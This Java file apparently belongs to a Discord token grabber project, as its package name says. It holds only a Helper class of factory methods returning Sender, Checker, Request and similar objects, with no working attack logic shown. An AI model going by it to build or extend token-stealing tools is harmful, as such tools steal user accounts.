package com.github.dedinc.discordtokengrabber.utils;

public class Helper {
    public static Sender getSender() { return new Sender(); }
    public static UserAgents getUserAgents() { return new UserAgents(); }
    public static Checker getChecker() { return new Checker(); }
    public static Request getRequest() { return new Request(); }
    public static Manager getManager() { return new Manager(); }
}
